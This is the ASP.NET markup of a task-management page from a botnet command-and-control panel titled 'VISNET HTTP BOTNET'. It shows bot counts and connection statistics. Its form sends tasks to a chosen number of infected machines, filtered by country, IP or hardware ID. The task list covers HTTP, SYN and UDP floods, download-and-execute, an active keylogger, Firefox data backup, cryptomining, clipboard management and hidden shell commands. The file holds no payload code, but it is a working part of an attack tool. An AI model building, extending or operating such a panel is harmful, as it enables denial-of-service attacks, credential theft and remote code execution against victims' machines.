<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Tasks.aspx.cs" Inherits="Tasks" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <title>VisNet Dashboard</title>
    <link href="CSS/menu.css" rel="stylesheet" />
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <script src="JS/jquery.easypiechart.min.js"></script>
    <script>
        $(function() {
            var $chart = $('.chart');
            $chart.easyPieChart({
                onStep: function(from, to, percent) {
                $(this.el).find('.percent').text(Math.round(percent));
                }
            });
        });
    </script>
</head>

<body class="Dashboard">
    <form id="form2" runat="server">
        <div class="color1 Sidebar">
            <ul>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="House" src="Image/HouseIcon.png" />
                    </a>
                </li>
                <li>
                    <a href="Tasks.aspx">
                        <img id="Logs" src="Image/Tasks.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Calender" src="Image/Calender.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Folder1" src="Image/folder.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Folder2" src="Image/folder.png" />
                    </a>
                </li>
            </ul>
        </div>

        <div class="TotalBotsSidebar">
            <div class="color2 AmountTotal">
                <ul>
                    <li>TOTAL BOTS:
                        <asp:Label ID="lblTotalBots" runat="server" Font-Names="Arial">0</asp:Label>
                    </li>
                </ul>
            </div>

            <div class="color1 AmountGraphs">
                <ul>
                    <li>Online Now</li>
                    <li>
                        <span class="chart" <asp:Literal ID="onlineNowPrec" runat="server"></asp:Literal>>
                         <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections Today</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connTodayPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections This Week</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connWeekPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections This Month</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connMonthPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>
                </ul>
            </div>
        </div>

        <div class="TitleBar">
            <div class="Title">
                <h1>VISNET HTTP BOTNET</h1>
            </div>
            <div class="Tabs">
                <ul>
                    <li class="right">
                        <a href="Logout.aspx">Logout</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="Tasks.aspx">Tasks Management</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="<%//TODO: Add a destenation%>">Connection Logs</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="Dashboard.aspx">DashBoard</a>
                    </li>
                </ul>
            </div>
        </div>

        <hr class="FirstLine" />

        <div class="Summary">
            <div class="color1 OnnlineNow">
                <asp:Label CssClass="Number" ID="lblOnnlineNow" runat="server" Text="0" ></asp:Label>
                <br />
                <asp:Label ID="lblOnnlineNowText" runat="server" Text="ONLINE NOW"></asp:Label>
            </div>

            <div class="color1 ConnectionsToday">
                <asp:Label CssClass="Number" ID="lblConnectionsToday" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsTodayText" runat="server" Text="CONNECTIONS TODAY"></asp:Label>
            </div>

            <div class="color1 ConnectionsWeek">
                <asp:Label CssClass="Number" ID="lblConnectionsWeek" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsWeekText" runat="server" Text="CONNECTIONS THIS WEEK"></asp:Label>
            </div>

            <div class="color1 ConnectionsMonth">
                <asp:Label CssClass="Number" ID="lblConnectionsMonth" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsMonthText" runat="server" Text="CONNECTIONS THIS MONTH"></asp:Label>
            </div>

            <div class="color1 ConnectionsTotal">
                <asp:Label CssClass="Number" ID="lblConnectionsTotal" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsTotalText" runat="server" Text="TOTAL CONNECTIONS"></asp:Label>
            </div>
        </div>
        <hr class="SecondLine"/>

        <div class="Tasks">
            <div class="color2 TaskName">
                <ul>
                    <li>TASK MANAGEMENT</li>
                </ul>
            </div>
            <div class="color1 TasksGrid">
                <div class="Grid">
                    <br />
                    <br />
                    <table class="auto-style1">
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblDropdown" runat="server" Text="Task"></asp:Label>
                            </td>
                            <td>
                    <asp:DropDownList ID="ddTask" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid" Height="35px" Width="260px">
                        <asp:ListItem Value="0" disabled selected hidden >Nothing selected</asp:ListItem>
                        <asp:ListItem Value="clipboard">Clipboard Manager</asp:ListItem>
                        <asp:ListItem Value="http">HTTP Flood</asp:ListItem>
                        <asp:ListItem Value="syn">SYN Flood</asp:ListItem>
                        <asp:ListItem Value="udp">UDP Flood</asp:ListItem>
                        <asp:ListItem Value="download">Download and Execute</asp:ListItem>
                        <asp:ListItem Value="firefox">FireFox Backup</asp:ListItem>
                        <asp:ListItem Value="homepage">Change Homepage</asp:ListItem>
                        <asp:ListItem Value="keylogger">Active Keylogger</asp:ListItem>
                        <asp:ListItem Value="mine">Mine</asp:ListItem>
                        <asp:ListItem Value="cleanse">System Cleanse</asp:ListItem>
                        <asp:ListItem Value="update">Update</asp:ListItem>
                        <asp:ListItem Value="uninstall">Uninstall</asp:ListItem>
                        <asp:ListItem Value="viewhidden">View Website (Hidden)</asp:ListItem>
                        <asp:ListItem Value="viewvisable">View Website (Visible)</asp:ListItem>
                        <asp:ListItem Value="shellvisable">Shell Command (Hidden)</asp:ListItem>
                        <asp:ListItem>Shell Command (Visible)</asp:ListItem>
                    </asp:DropDownList>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblFilter" runat="server" Text="Filter"></asp:Label>
                            </td>
                            <td>
                    <asp:TextBox ID="txtFilter" runat="server" placeholder="Example: US, 127.0.0.1, BFEBFBFF000306C3" Width="530px" Height="30px"></asp:TextBox>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblAmount" runat="server" Text="Amount"></asp:Label>
                            </td>
                            <td>
                    <asp:TextBox ID="txtAmount" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px"></asp:TextBox>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">&nbsp;</td>
                            <td>
                    <asp:Button ID="btnSubmit" cssClass="color2" runat="server" Text="SUBMIT" OnClick="btnSubmit_Click" />
                            </td>
                        </tr>
                    </table>
                    <br />
                    <asp:Label ID="lblError" runat="server" Text=""></asp:Label>
                    <br />
                    <br />
                    <div class="Grid">
                        <asp:GridView cssClass="grdTask color2" ID="grdTask" runat="server" onrowdatabound="grdTask_RowDataBound" AutoGenerateColumns="False" style="margin-right: 0px" OnRowDeleting="grdTask_RowDeleting" Width="1563px">
                            <Columns>
                                <asp:TemplateField HeaderText="NO.">
                                    <ItemTemplate>
                                        <asp:Label ID="lblTaskID" runat="server" Text='<%# Eval("TaskID") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="TYPE">
                                    <ItemTemplate>
                                        <asp:Label ID="lblType" runat="server" Text='<%# Eval("Type") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="PARAMETER 1">
                                    <ItemTemplate>
                                        <asp:Label ID="lblParameter1" runat="server" Text='<%# Eval("Parameter1") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="PARAMETER 2">
                                    <ItemTemplate>
                                        <asp:Label ID="lblParameter2" runat="server" Text='<%# Eval("Parameter2") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="PARAMETER 3">
                                    <ItemTemplate>
                                        <asp:Label ID="lblParameter3" runat="server" Text='<%# Eval("Parameter3") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="PARAMETER 4">
                                    <ItemTemplate>
                                        <asp:Label ID="lblParameter4" runat="server" Text='<%# Eval("Parameter4") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="MAX AMOUNT">
                                    <ItemTemplate>
                                        <asp:Label ID="lblMax" runat="server" Text='<%# Eval("Max") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="RUNNING AMOUNT">
                                    <ItemTemplate>
                                        <asp:Label ID="lblRunning" runat="server" Text='<%# Eval("Ran") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="FILTER">
                                    <ItemTemplate>
                                        <asp:Label ID="lblFilter" runat="server" Text='<%# Eval("Filter") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="STATUS">
                                    <ItemTemplate>
                                        <asp:Label ID="lblStatus" runat="server" Text='<%# Eval("Status") %>'></asp:Label>
                                    </ItemTemplate>
                                </asp:TemplateField>
                                <asp:CommandField DeleteText="Remove Task" HeaderText="OPTIONS" ShowDeleteButton="True" />
                            </Columns>
                        </asp:GridView>
                    </div>
                </div>
            </div>
        </div>
    </form>
</body>
</html>
